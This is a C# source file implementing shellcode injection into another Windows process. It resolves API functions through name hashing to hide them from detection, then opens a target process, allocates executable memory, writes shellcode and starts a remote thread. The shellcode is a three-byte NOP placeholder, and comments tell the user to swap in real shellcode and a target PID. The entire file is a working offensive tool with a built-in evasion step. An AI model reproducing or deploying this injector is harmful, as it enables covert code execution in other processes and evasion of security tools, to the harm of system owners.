using System;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Dynamic_Invoke
{
    class Program
    {
        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        public delegate IntPtr OpenProcessDelegate(
        UInt32 dwDesiredAccess,
        bool bInheritHandle,
        UInt32 dwProcessId);

        public delegate IntPtr VirtualAllocExDelegate(
        IntPtr hProcess,
        IntPtr lpAddress,
        int dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);

        public delegate uint WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        ref int lpNumberOfBytesWritten);

        public delegate IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        UInt32 dwStackSize,
        IntPtr lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref int lpThreadId);

        public static T InvokeAPI<T>(uint type_requested, uint api_requested, object[] args)
        {

            // Get the System assembly
            Assembly systemAssembly = typeof(void).Assembly;

            Type type = systemAssembly.GetTypes().First(t => ROR13Hash(t.FullName) == type_requested);

            var api = type.GetRuntimeMethods().First(m => ROR13Hash(m.Name) == api_requested);


            if (api != null)
                return (T)api.Invoke(null, args);

            return default;
        }

        // ROR13Hash stolen from https://github.com/ihack4falafel/ROR13HashGenerator/blob/master/ROR13HashGenerator/ROR13HashGenerator/Program.cs
        public static uint ROR13Hash(string FunctionName)
        {
            uint functionHash = 0;
            foreach (char c in FunctionName)
            {
                uint i = (uint)c;
                functionHash = ((functionHash >> 17 | functionHash << (15)) & 0xFFFFFFFF);
                functionHash = (functionHash + i);
            }
            return functionHash;
        }



        static void Main(string[] args)
        {

            var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;

            // Make sure to change the shellcode
            byte[] shellcode = { 0x90, 0x90, 0x90 };


            int shellcode_size = shellcode.Length;
            int bytesWritten = 0;
            int lpthreadID = 0;


            // Get a handle to kernel32.dll
            var kernel32_module = InvokeAPI<IntPtr>(
                300004761,
                1029904206,
                new object[] { "kernel32.dll" }); // GetModuleHandle("kernel32.dll");


            // Find OpenProcess
            var OpenProcess_address = InvokeAPI<IntPtr>(
                300004761,
                228323404,
                new object[] { kernel32_module, "OpenProcess" }); // GetProcAddress(kernel32_module, "OpenProcess")



            // Create a delegate for the function
            OpenProcessDelegate openProcess =
                Marshal.GetDelegateForFunctionPointer<OpenProcessDelegate>(OpenProcess_address);

            // Call OpenProcess
            IntPtr procHandle = openProcess((uint)desiredAccess, false, 4412); // make sure to change the PID. 4412 was used during testing


            // Find VirtualAllocEx
            var VirtualAllocEx_Address = InvokeAPI<IntPtr>(
                300004761,
                228323404,
                new object[] { kernel32_module, "VirtualAllocEx" }); // GetProcAddress(kernel32_module, "VirtualAllocEx")

            // Create a delegate for the function
            VirtualAllocExDelegate virtualAllocEx =
                Marshal.GetDelegateForFunctionPointer<VirtualAllocExDelegate>(VirtualAllocEx_Address);

            // Call VirtualAllocEx
            IntPtr init = virtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);


            // Find WriteProcessMemory
            var WriteProcessMemory_Address = InvokeAPI<IntPtr>(
                300004761,
                228323404,
                new object[] { kernel32_module, "WriteProcessMemory" }); // GetProcAddress(kernel32_module, "WriteProcessMemory")
            
            // Create a delegate for the function
            WriteProcessMemory writeprocessmemory =
                Marshal.GetDelegateForFunctionPointer<WriteProcessMemory>(WriteProcessMemory_Address);

            // Call WriteProcessMemory
            writeprocessmemory(procHandle, init, shellcode, shellcode_size, ref bytesWritten);
            Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);


            // Find CreateRemoteThread
            var CreateRemoteThread_Address = InvokeAPI<IntPtr>(
                300004761,
                228323404,
                new object[] { kernel32_module, "CreateRemoteThread" }); // GetProcAddress(kernel32_module, "CreateRemoteThread")

            // Create a delegate for the function
            CreateRemoteThread createremotethread =
                Marshal.GetDelegateForFunctionPointer<CreateRemoteThread>(CreateRemoteThread_Address);

            // Call CreateRemoteThread
            IntPtr threadPTR = createremotethread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);
            Console.WriteLine("[*] Thread ID: {0}", lpthreadID);


        }
    }
}
